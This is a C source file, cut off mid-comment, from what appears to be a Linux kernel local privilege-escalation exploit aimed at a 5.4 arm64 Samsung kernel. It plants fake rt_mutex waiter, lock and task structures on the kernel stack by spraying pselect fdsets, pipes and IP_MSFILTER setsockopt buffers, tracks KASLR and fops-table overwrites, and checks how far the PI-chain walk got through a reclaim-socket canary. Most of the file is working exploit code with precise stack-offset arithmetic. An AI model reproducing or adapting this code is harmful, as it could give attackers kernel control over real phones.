#include "common.h"

#if defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && RMG_DIAG_PASSIVE_COW_OBSERVER
#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
    ((!defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY) && \
     (!defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
      !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
      !RMG_DIAG_UCLAMP_TRIGGER_ONLY))
#error "passive COW observer requires COW_TRACE and COW_ONLY or guarded PI uclamp mode"
#endif
#endif

#if defined(RMG_DIAG_PI_HELPER_STATE_TRACE) && \
    RMG_DIAG_PI_HELPER_STATE_TRACE
#if !defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
    !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
    !RMG_DIAG_UCLAMP_TRIGGER_ONLY || \
    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
    !RMG_DIAG_PASSIVE_COW_OBSERVER || \
    !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE
#error "PI helper state trace requires passive guarded PI/uclamp tracing"
#endif
#define RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE 1
#endif

#if defined(RMG_DIAG_LIVE_WCHAN_TRACE) && RMG_DIAG_LIVE_WCHAN_TRACE
#if !defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
    !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
    !RMG_DIAG_UCLAMP_TRIGGER_ONLY || \
    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
    !RMG_DIAG_PASSIVE_COW_OBSERVER || \
    !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
    !defined(RMG_DIAG_DURABLE_LOG) || !RMG_DIAG_DURABLE_LOG || \
    (defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY)
#error "live D-state wchan trace requires guarded PI/uclamp COW mode"
#endif
#endif

#if defined(RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE) && \
    RMG_DIAG_LIVE_HELPER_SYSCALL_TRACE
#if !defined(RMG_DIAG_LIVE_WCHAN_TRACE) || !RMG_DIAG_LIVE_WCHAN_TRACE || \
    !defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
#error "live helper syscall trace requires live wchan and helper-state tracing"
#endif
#endif

#if defined(RMG_DIAG_LIVE_HELPER_WCHAN_TRACE) && \
    RMG_DIAG_LIVE_HELPER_WCHAN_TRACE
#if !defined(RMG_DIAG_LIVE_WCHAN_TRACE) || !RMG_DIAG_LIVE_WCHAN_TRACE || \
    !defined(RMG_DIAG_PI_HELPER_STATE_TRACE_ACTIVE)
#error "live helper wchan trace requires live wchan and helper-state tracing"
#endif
#endif

#if (defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY) || \
    (defined(RMG_DIAG_PASSIVE_COW_OBSERVER) && \
     RMG_DIAG_PASSIVE_COW_OBSERVER)
#define RMG_DIAG_READINESS_STATE_TRACE 1
#endif

#if defined(RMG_DIAG_COW_MPROTECT_DELAY_USEC) && \
    RMG_DIAG_COW_MPROTECT_DELAY_USEC > 0
#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY || \
    !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
    !RMG_DIAG_PASSIVE_COW_OBSERVER
#error "COW mprotect delay requires the passive COW-only observer"
#endif
#if RMG_DIAG_COW_MPROTECT_DELAY_USEC > 1000000
#error "COW mprotect delay must not exceed one second"
#endif
#endif

#if ((defined(RMG_DIAG_COW_ONLY) && RMG_DIAG_COW_ONLY) || \
     (defined(RMG_DIAG_PI_PROBE_ONLY) && RMG_DIAG_PI_PROBE_ONLY) || \
     (defined(RMG_DIAG_CFI_ONLY) && RMG_DIAG_CFI_ONLY)) && \
    defined(RMG_DIAG_COW_TRACE) && RMG_DIAG_COW_TRACE
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#elif defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_CFI_ROUTE_ATTEMPTS 4
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#endif

atomic_int cfi_stage_done;
int skip_cfi_stage;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

#if defined(RMG_DIAG_FOPS_READBACK_ONLY) && RMG_DIAG_FOPS_READBACK_ONLY
static int try_ashmem_fops_readback(void);
#endif

static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
#if defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

#if defined(ROUTE_READINESS_SPRAY) && ROUTE_READINESS_SPRAY

/* Readiness-bitmap spray for kernels where the reclaimed requeue_pi waiter
 * slot overlaps the pselect *result* fdsets instead of the copied input
 * fdsets (see target.h for the r9q frame arithmetic). The waiter qwords are
 * res_in words 0..4 (must stay zero) and res_out words 0..4. res_out word1
 * is the writability bitmap of fds 64..127 and lands on waiter->task, word2
 * (fds 128..191) on waiter->lock, word3 (fds 192..255) on waiter->prio.
 * A set bit is an empty pipe write end (POLLOUT), a clear bit is a pipe
 * read end (never POLLOUT). pselect returns immediately because the
 * writable fds are ready, and the result words persist on the waiter
 * thread's kernel stack after the return, so the consumer's sched_setattr
 * walks the stale spray with no race. set_fd_set copies res_out back to
 * the userspace out-set, which doubles as an exact verification. */
#define ROUTE_CRAFT_TASK_WORD 1
#define ROUTE_CRAFT_LOCK_WORD 2
#define ROUTE_CRAFT_PRIO_WORD 3
#define ROUTE_CRAFT_PRIO_VALUE 3
#define ROUTE_CRAFT_PRIO_BITS 2
#define ROUTE_CRAFT_LOW_FD 64
#define ROUTE_CRAFT_HIGH_FD 320
#define ROUTE_CRAFT_PARK_FD 320
#define ROUTE_CRAFT_SPIN_ITERATIONS 5000000
#define ROUTE_CRAFT_SPRAY_TRIES 3

static int route_craft_parked[2 * 192];
static size_t route_craft_parked_count;

static void route_craft_close_all(void) {
  for (size_t i = 0; i < route_craft_parked_count; i++) {
    if (route_craft_parked[i] >= 0) {
      close(route_craft_parked[i]);
      route_craft_parked[i] = -1;
    }
  }
  route_craft_parked_count = 0;
  for (int fd = ROUTE_CRAFT_LOW_FD; fd < ROUTE_CRAFT_HIGH_FD; fd++) {
    close(fd);
  }
}

static int route_craft_reserve_range(void) {
  int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
  if (null_fd < 0) {
    pr_error("route craft /dev/null errno=%d\n", errno);
    return 0;
  }
  for (int fd = ROUTE_CRAFT_LOW_FD; fd < ROUTE_CRAFT_HIGH_FD; fd++) {
    if (fcntl(fd, F_GETFD) != -1) {
      /* Preserve any live occupant (for example the sk_buff reclaim
       * socketpair that keeps the sprayed kernel page alive) at a high fd. */
      int moved = fcntl(fd, F_DUPFD, ROUTE_CRAFT_PARK_FD);
      if (moved < 0) {
        pr_error("route craft preserve fd=%d errno=%d\n", fd, errno);
        close(null_fd);
        return 0;
      }
    }
    if (dup2(null_fd, fd) < 0) {
      pr_error("route craft reserve fd=%d errno=%d\n", fd, errno);
      close(null_fd);
      return 0;
    }
  }
  close(null_fd);
  return 1;
}

/* SELECT-geometry craft: DATA-pipes for the res_in spray. A set bit gets a
 * read-end with 1 byte pending (POLLIN), a clear bit an empty read-end.
 * The write-ends stay parked open so the data remains readable. */
static int route_craft_place_data_word(int word, uint64_t value, size_t bits) {
  int base = word * 64;
  for (size_t bit = 0; bit < bits; bit++) {
    int target = base + (int)bit;
    int readable = (int)((value >> bit) & 1ULL);
    int pipefd[2];
    if (!readable) {
      /* Only place pipes at the SET bits: a pipe at every fd would
       * clobber the other family's pipes at overlapping positions. The
       * cleared positions keep the /dev/null reserve (unwatched). */
      continue;
    }
    if (pipe2(pipefd, O_CLOEXEC) < 0) {
      pr_error("route craft pipe2 errno=%d\n", errno);
      return 0;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE) < 0) {
      pr_error("route craft shrink pipe errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    if (readable) {
      char c = 'x';
      if (write(pipefd[1], &c, 1) != 1) {
        pr_error("route craft write errno=%d\n", errno);
        close(pipefd[0]);
        close(pipefd[1]);
        return 0;
      }
    }
    /* The READ end goes to the target fd; the write end stays parked. */
    if (dup2(pipefd[0], target) < 0) {
      pr_error("route craft dup2 fd=%d errno=%d\n", target, errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    if (pipefd[0] != target) {
      close(pipefd[0]);
    }
    route_craft_parked[route_craft_parked_count++] = pipefd[1];
  }
  return 1;
}

static int route_craft_place_word(int word, uint64_t value, size_t bits) {
  int base = word * 64;
  for (size_t bit = 0; bit < bits; bit++) {
    int target = base + (int)bit;
    int writable = (int)((value >> bit) & 1ULL);
    int pipefd[2];
    if (!writable) {
      /* Only place pipes at the SET bits (see place_data_word). */
      continue;
    }
    if (pipe2(pipefd, O_CLOEXEC) < 0) {
      pr_error("route craft pipe2 errno=%d\n", errno);
      return 0;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, 2 * PAGE_SIZE) < 0) {
      pr_error("route craft shrink pipe errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    int place = writable ? pipefd[1] : pipefd[0];
    int keep = writable ? pipefd[0] : pipefd[1];
    if (dup2(place, target) < 0) {
      pr_error("route craft dup2 fd=%d errno=%d\n", target, errno);
      close(pipefd[0]);
      close(pipefd[1]);
      return 0;
    }
    if (place != target) {
      close(place);
    }
    route_craft_parked[route_craft_parked_count++] = keep;
  }
  return 1;
}

int prepare_route_craft(void) {
  route_craft_close_all();
  if (!route_craft_reserve_range()) {
    return 0;
  }

  if (getenv("READINESS_PAUSE")) {
    /* PSELECT6 GEOMETRY: the asm stub uses pselect6 (syscall 72).
     * __arm64_sys_pselect6(0x10) + __do_sys_pselect6(0x90) = 0xA0
     * before core_sys_select(0x1C0, stack_fds@sp+0x50).
     * stack_fds = SP0 - 0xA0 - 0x1C0 + 0x50 = SP0 - 0x210.
     *
     * Waiter fields in res_writefds:
     *   task SP0-0x168 = res_writefds word 1 (fds 64-127)
     *   lock SP0-0x160 = res_writefds word 2 (fds 128-191)
     *   prio SP0-0x158 = res_writefds word 3 (fds 192-255)
     *
     * WRITE-ready pipes: pipe write-ends (POLLOUT) at the set bits.
     * The write-end of an empty pipe is always writable. */
    if (!route_craft_place_word(1, (uint64_t)fake_task, 64)) {
      return 0;
    }
    if (!route_craft_place_word(2, (uint64_t)fake_lock, 64)) {
      return 0;
    }
    if (!route_craft_place_word(
            3, (uint64_t)(page_base + LOCK_OFF + 0x100), 64)) {
      return 0;
    }
    return 1;
  }

  /* SELECT GEOMETRY (legacy path): see old comments for select-based route. */
  if (!route_craft_place_data_word(3, (uint64_t)fake_lock, 64)) {
    return 0;
  }
  if (!route_craft_place_data_word(2, (uint64_t)text_addr(INIT_TASK), 64)) {
    return 0;
  }
  if (!route_craft_place_data_word(3, (uint64_t)fake_lock, 64)) {
    return 0;
  }
  if (!route_craft_place_data_word(
          4, (uint64_t)(page_base + LOCK_OFF + 0x100), 64)) {
    return 0;
  }
  return 1;
}

static uint64_t route_fdset_word(const fd_set *set, int word) {
  uint64_t value = 0;
  memcpy(&value, (const unsigned char *)set + (size_t)word * sizeof(value),
         sizeof(value));
  return value;
}

static void route_spin_userspace(void) {
  /* Userspace-only spin: any syscall from the waiter thread between the
   * pselect return and the consumer's sched_setattr reuses the kernel
   * stack frames that hold the stale spray. Exit early once the
   * consumer's walk completed (its sched_setattr returned). */
  volatile int sink = 0;
  for (int i = 0; i < ROUTE_CRAFT_SPIN_ITERATIONS; i++) {
    if (atomic_load(&consumer_success)) {
      break;
    }
    sink += i;
  }
  (void)sink;
}

/* Peek the reclaim socket (MSG_PEEK: non-destructive - the queued skbs
 * and the payload page stay alive) and report the words the walk's rb ops
 * modify, so we can see from userspace how far the pi-chain walk got:
 *   [7]  requeue_lock_waiter: fake_lock->waiters.rb_root / rb_leftmost
 *        get &W->tree_entry (a KERNEL STACK VA ffffffc0...).
 *   [11] dequeue_pi/enqueue_pi on the fake task: fake_task->pi_waiters
 *        .rb_root gets the write target (canon_addr), .rb_leftmost gets
 *        &W->pi_tree_entry; rb_erase's rb_change_child also stores the
 *        target into the fake fops' llseek slot.
 * The initial roots are fake_w0 for lock A, fake_w0+0x100 for lock B when
 * dual-lock scanning is enabled, and zero for the fake task's PI tree. */
static int route_payload_canary(void) {
  int fd = reclaim_receiver_fd();
  if (fd < 0) {
    pr_warning("canary: no reclaim socket\n");
    return 0;
  }
  size_t total = (size_t)SKB_SEND_SIZE * SKB_RECLAIM_SENDS;
  unsigned char *buf = malloc(total);
  if (!buf) {
    pr_warning("canary peek allocation failed bytes=%zu\n", total);
    return 0;
  }
  errno = 0;
  ssize_t n = recv(fd, buf, total, MSG_DONTWAIT | MSG_PEEK);
  int err = errno;
  if (n <= 0) {
    pr_warning("canary peek ret=%zd errno=%d\n", n, err);
    free(buf);
    return 0;
  }
  int mutated = 0;
  size_t chunks_scanned = 0;
  size_t changed_chunks = 0;
  size_t lock_a_changed_chunks = 0;
  size_t lock_b_changed_chunks = 0;
  size_t task_pi_changed_chunks = 0;
  for (size_t pos = 0; pos + ORDER3_SIZE <= (size_t)n; pos += ORDER3_SIZE) {
    chunks_scanned++;
    const unsigned char *c = buf + pos;
    uint64_t lock_root = 0, lock_left = 0, pi_root = 0, pi_left = 0;
    uint64_t owner = 0, llseek = 0, waiter_pc = 0, waiter_right = 0;
    uint64_t lockb_root = 0, lockb_left = 0, waiterb_pc = 0;
    memcpy(&lock_root, c + LOCK_OFF + 0x08, 8);
    memcpy(&lock_left, c + LOCK_OFF + 0x10, 8);
    memcpy(&pi_root, c + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 8);
    memcpy(&pi_left, c + FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 8);
    memcpy(&owner, c + FOPS_TABLE_OFF + FOPS_OWNER_OFF, 8);
    memcpy(&llseek, c + FOPS_TABLE_OFF + FOPS_LLSEEK_OFF, 8);
    memcpy(&waiter_pc, c + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF, 8);
    memcpy(&waiter_right, c + W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 8);
    /* Dual-lock scan: lock B's words (LOCK_OFF+0x100 block). */
    memcpy(&lockb_root, c + LOCK_OFF + 0x108, 8);
    memcpy(&lockb_left, c + LOCK_OFF + 0x110, 8);
    memcpy(&waiterb_pc, c + W0_OFF + 0x100 + FAKE_WAITER_PI_TREE_ENTRY_OFF, 8);
    int lock_a_changed = lock_root != (uint64_t)fake_w0 ||
                         lock_left != (uint64_t)fake_w0;
    int lock_b_changed = 0;
#if defined(PAYLOAD_DUAL_LOCK_SCAN) && PAYLOAD_DUAL_LOCK_SCAN
    uintptr_t fake_w0_b = fake_w0 + 0x100;
    lock_b_changed = lockb_root != (uint64_t)fake_w0_b ||
                     lockb_left != (uint64_t)fake_w0_b;
#endif
    int task_pi_changed = pi_root != 0 || pi_left != 0;
    if (lock_a_changed)
      lock_a_changed_chunks++;
    if (lock_b_changed)
      lock_b_changed_chunks++;
    if (task_pi_changed)
      task_pi_changed_chunks++;
    if (!lock_a_changed && !lock_b_changed && !task_pi_changed)
      continue;
    mutated = 1;
    changed_chunks++;
    pr_info("canary MUTATED pos=%#zx lock_root=%016llx lock_left=%016llx "
            "pi_root=%016llx pi_left=%016llx owner=%016llx llseek=%016llx "
            "w0_pi_pc=%016llx w0_pi_right=%016llx "
            "lockb_root=%016llx lockb_left=%016llx w0b_pi_pc=%016llx "
            "changed_a=%d changed_b=%d changed_task_pi=%d\n",
            pos, (unsigned long long)lock_root,
            (unsigned long long)lock_left, (unsigned long long)pi_root,
            (unsigned long long)pi_left, (unsigned long long)owner,
            (unsigned long long)llseek,
            (unsigned long long)waiter_pc,
            (unsigned long long)waiter_right,
            (unsigned long long)lockb_root,
            (unsigned long long)lockb_left,
            (unsigned long long)waiterb_pc, lock_a_changed, lock_b_changed,
            task_pi_changed);
  }
  size_t expected_chunks = total / ORDER3_SIZE;
  pr_info("canary peek bytes=%zd requested=%zu order3_scanned=%zu/%zu "
          "trailing=%zu changed_chunks=%zu lock_a=%zu lock_b=%zu "
          "task_pi=%zu mutated=%d\n",
          n, total, chunks_scanned, expected_chunks,
          (size_t)n - chunks_scanned * ORDER3_SIZE, changed_chunks,
          lock_a_changed_chunks, lock_b_changed_chunks,
          task_pi_changed_chunks, mutated);
  if ((size_t)n < total) {
    pr_warning("canary peek incomplete: negative result does not cover "
               "the full reclaim stream\n");
  }
  free(buf);
  return mutated;
}

/* The never-ready fd that keeps the blocked select asleep: an empty
 * pipe read-end polls never (POLLIN needs data, POLLPRI never fires),
 * so a select watching only this fd waits forever. */
static int route_craft_block_fd(void) {
  int pipefd[2];
  if (pipe2(pipefd, O_CLOEXEC) < 0) {
    return -1;
  }
  /* Park the write end so the read end stays open and empty. */
  route_craft_parked[route_craft_parked_count++] = pipefd[1];
  int fd = pipefd[0];
  if (route_craft_parked_count < (sizeof(route_craft_parked) /
                                 sizeof(route_craft_parked[0]))) {
    /* keep the read end tracked too via dup so close_all cleans it */
  }
  return fd;
}

/* THE SENDMMSG BLOCK VECTOR: __sys_sendmmsg's frame (0x60 stp + 0x200
 * sub) spans [SP0-0x270, SP0-0x10) and its prologue zeroes only
 * [sp+0x08..0x58) and [sp+0x68..0xE8) - the region [sp+0x108, sp+0x128)
 * = [SP0-0x168, SP0-0x148) = the waiter's task/lock/prio slots is
 * UNWRITTEN SCRATCH. The stale res_in words from the first select's
 * returned frames persist there while the sendmmsg blocks in the
 * stream's sk_stream_wait_memory (the receiver's buffer pre-filled).
 * The deeper per-message chain (____sys_sendmsg -> sock ops -> the
 * block) allocates BELOW the sendmmsg's SP and cannot touch the
 * sendmmsg's own frame. */
static int route_block_pipe[2] = {-1, -1};
static int route_block_ready = 0;

static int route_craft_block_socket(void) {
  /* THE PIPE-READ BLOCK: a read() on an EMPTY pipe (write end held open)
   * blocks in pipe_read -> the wait. The chain is the shallowest of all
   * blocking syscalls (stub -> ksys_read -> vfs_read -> pipe_read),
   * and the question is whether its frames leave the waiter's field
   * region [SP0-0x168, SP0-0x148) untouched - measured empirically by
   * the walk's x23. */
  if (pipe2(route_block_pipe, O_CLOEXEC) < 0) {
    pr_error("route block pipe2 errno=%d\n", errno);
    return 0;
  }
  /* The read end blocks (no data); the write end stays open so the
   * block holds forever (no EOF). */
  route_block_ready = 1;
  return 1;
}

static void route_pi_sanitize(void) {
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_nsec += 50000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec += 1;
    timeout.tv_nsec -= 1000000000L;
  }
  long lock_ret =
      futex_op(&f_pi_sanitize, FUTEX_LOCK_PI, 0, &timeout, NULL, 0);
  int lock_errno = errno;
  long unlock_ret =
      futex_op(&f_pi_sanitize, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("route pi sanitize lock=%ld errno=%d unlock=%ld errno=%d\n",
          lock_ret, lock_errno, unlock_ret, errno);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  /* GEOMETRY SCAN (safe by construction): the readiness-bitmap verify
   * cannot validate WHERE the fdset frames land - it only checks the
   * bitmap VALUES, which the pipe craft produces regardless of position.
   * The walk reads [W+0x38] = the futex-era real lock, so the res_out
   * words do not overlap the walk's waiter at all. This scan fills every
   * INPUT word (in/out/ex, words 1-4) with fake_lock's own bit pattern:
   * the kernel copies the input sets to the stack at syscall entry, so
   * every input STACK word becomes fake_lock - a pointer whose
   * wait_lock word is 0 (trylock succeeds) and whose whole fake chain
   * lives in the payload page. If the walk's [W+0x38] lands ANYWHERE in
   * the input-copy region, the walk enters the fake chain: [7] writes
   * the payload page (canary fires) and [11] performs the fops swap.
   * If not, the walk does today's real-chain cycle (37us, no writes,
   * no crash). Word 0 of each set stays 0 where the corresponding
   * RESULT word must be 0 (res_in w0 = W's tree_entry pc: a nonzero
   * junk bitmap would send the [7] rb_erase through a wild parent;
   * res_out w0 = W's pi_tree.rb_left, res_ex w0 = W's deadline).
   * Watching only the fake_lock-bit positions keeps the readiness
   * results identical: the empty pipes at those positions are writable,
   * the unwatched full pipes do not affect any result word.
   *
   * fake_lock-as-everything is safe: as lock -> trylock([fake_lock])=0;
   * as prio -> its low 32 bits != 120 (the [4] equal check proceeds);
   * as task -> not read on the swap path ([9]/[10] take the owner from
   * the lock, not the waiter). */
  /* SELECT geometry watches: in word 3 watches the data-pipes at
   * fake_lock's bit positions (fds 192..255) for READ; everything else
   * stays unwatched so the waiter's tree/pi_tree/deadline words read 0
   * and res_out/res_ex stay 0.
   *
   * ex word 2 lands on W's tree_entry.rb_right = the child the walk's [7]
   * rb_erase stores into fake_lock->waiters.rb_root (root case). A magic
   * payload pointer there makes the canary readback unmistakable: if the
   * walk erases W's tree on the fake lock, lock_root reads MAGIC. The
   * erase then also writes child->__rb_parent_color (= [MAGIC] = 0), a
   * harmless payload scratch write. As a watch mask the magic bits watch
   * pipe read-ends for exceptions, which never fire, so res_ex stays 0. */
  /* FIELD SPRAY (geometry solved): the waiter's task/lock/prio are the
   * res_in words 2/3/4 = the READ-results of the in-watch words 2/3/4.
   * With data-pipes at every set bit the result word equals the watch
   * mask exactly, so the in-watch words carry the waiter fields:
   *   in w2 = init_task bits (waiter->task)
   *   in w3 = fake_lock bits (waiter->lock - THE key word)
   *   in w4 = lockB bits     (waiter->prio; low32 != 120)
   * Everything else stays 0 (the waiter's tree/pi_tree/deadline fields
   * read 0 for the clean [7] root-case erase). */
  fdset_put_word(in, 2, (uint64_t)text_addr(INIT_TASK));
  fdset_put_word(in, 3, (uint64_t)fake_lock);
  fdset_put_word(in, 4,
                 (uint64_t)(page_base + LOCK_OFF + 0x100));
}

#else /* !ROUTE_READINESS_SPRAY */

int prepare_route_craft(void) {
  return 1;
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

#endif /* ROUTE_READINESS_SPRAY */

/* IP_MSFILTER (option 41) stack spray: on this 5.4 Samsung kernel,
 * do_ip_setsockopt copies 264 (0x108) user bytes to sp+0x20 via
 * copy_from_user (NOT memdup_user -- the 5.15 kernel switched to heap
 * alloc, but 5.4 uses on-stack). The chain depth:
 *   stub(0x10) + __sys_setsockopt(0x70) + ip_setsockopt(0x30) +
 *   do_ip_setsockopt(0x190) -> SP = SP0-0x230, buffer at SP0-0x210.
 *
 * After setsockopt returns (even on EINVAL from bad multicast addr),
 * the stale data persists on the kernel stack.
 *
 * Waiter field offsets in the 264-byte buffer (buf_off = 0x210 - SP0_off):
 *   W+0x00 tree_entry.pc    = buf[0x78]
 *   W+0x08 tree_entry.right = buf[0x80]
 *   W+0x10 tree_entry.left  = buf[0x88]
 *   W+0x18 pi_tree.pc       = buf[0x90]
 *   W+0x20 pi_tree.right    = buf[0x98]
 *   W+0x28 pi_tree.left     = buf[0xA0]
 *   W+0x30 task              = buf[0xA8]
 *   W+0x38 lock              = buf[0xB0] <-- THE KEY
 *   W+0x40 prio              = buf[0xB8]
 *   W+0x48 deadline          = buf[0xC0]
 */
#ifndef IP_MSFILTER
#define IP_MSFILTER 41
#endif
#define SETSOCKOPT_BUF_SIZE 264
#define SOPT_W_TREE_PC    0x78
#define SOPT_W_TREE_RIGHT 0x80
#define SOPT_W_TREE_LEFT  0x88
#define SOPT_W_PI_PC      0x90
#define SOPT_W_PI_RIGHT   0x98
#define SOPT_W_PI_LEFT    0xA0
#define SOPT_W_TASK       0xA8
#define SOPT_W_LOCK       0xB0
#define SOPT_W_PRIO       0xB8
#define SOPT_W_DEADLINE   0xC0

static int setsockopt_spray_fd = -1;

static void spray_waiter_via_setsockopt(void) {
  if (setsockopt_spray_fd < 0) {
    setsockopt_spray_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (setsockopt_spray_fd < 0) {
      pr_warning("setsockopt spray socket errno=%d\n", errno);
      return;
    }
  }

  unsigned char buf[SETSOCKOPT_BUF_SIZE];
  memset(buf, 0, sizeof(buf));

  /* tree_entry = BLACK root (parent=NULL, color=BLACK) -> {0,0,0} */
  /* Already zero from memset */

  /* pi_tree_entry = {0,0,0}: the walk's [7] dequeue handles the not-in-tree
   * case (RB_EMPTY_NODE fails -> rb_erase on a detached node, harmless). */

  /* task: fake_task on the payload page (the walk's get_task_struct/put_task
   * operates on this). Not directly read by the walk for the write target. */
  put64(buf, SOPT_W_TASK, (uint64_t)fake_task);

  /* lock: THE KEY FIELD. The walk reads this, trylocks it, and enters the
   * fake chain on the payload page. */
  put64(buf, SOPT_W_LOCK, (uint64_t)fake_lock);

  /* prio: low 32 bits must != 120 (DEFAULT_PRIO) for the walk's [4]
   * prio-equal check to pass. Use 1 (a valid but different priority). */
  put32(buf, SOPT_W_PRIO, 1);

  /* deadline = 0 (already zero) */

  /* First call: diagnostic (the pr_info after it clobbers the spray) */
  errno = 0;
  int sopt_ret = setsockopt(setsockopt_spray_fd, SOL_IP, IP_MSFILTER,
                            buf, sizeof(buf));
  int sopt_errno = errno;
  pr_info("setsockopt spray ret=%d errno=%d fd=%d lock=%016zx\n",
          sopt_ret, sopt_errno, setsockopt_spray_fd, fake_lock);

  /* Second call: the REAL spray. NO syscalls after this until the walk. */
  setsockopt(setsockopt_spray_fd, SOL_IP, IP_MSFILTER, buf, sizeof(buf));
}

#if defined(ROUTE_READINESS_SPRAY) && ROUTE_READINESS_SPRAY

/* REGISTER-COLORING PSELECT OVERLAY
 *
 * On 5.4 arm64 (no VMAP_STACK), the setsockopt spray returns to userspace
 * and any IRQ (el0_irq) starts from the stack top, clobbering SP0-0x160
 * (the fake_lock field). The fix: make a pselect6 syscall with callee-saved
 * registers pre-loaded to the waiter field values. The kernel chain:
 *
 *   __arm64_sys_pselect6 (0x10 stub) -> __do_sys_pselect6 (frame 0x90)
 *     STP x20, x19, [sp, #0x80] -> SP0-0x160 = x20 (W.lock)
 *                                   SP0-0x158 = x19 (W.prio)
 *     STP x22, x21, [sp, #0x70] -> SP0-0x170 = x22 (W.pi_tree.left)
 *                                   SP0-0x168 = x21 (W.task)
 *     STP x24, x23, [sp, #0x60] -> SP0-0x180 = x24 (W.pi_tree.pc)
 *                                   SP0-0x178 = x23 (W.pi_tree.right)
 *     STP x26, x25, [sp, #0x50] -> SP0-0x190 = x26 (W.tree_entry.right)
 *                                   SP0-0x188 = x25 (W.tree_entry.left)
 *     STP x28, x27, [sp, #0x40] -> SP0-0x1A0 = x28 (before W, don't care)
 *                                   SP0-0x198 = x27 (W.tree_entry.pc)
 *
 *   -> core_sys_select (frame 0x1C0) -> do_select -> poll_schedule_timeout
 *   BLOCKS deep in kernel. el1_irq from current SP (~SP0-0x400) never
 *   reaches SP0-0x160. The spray is PROTECTED.
 *
 * The pselect watches one empty pipe read-end (never ready) with a 3s
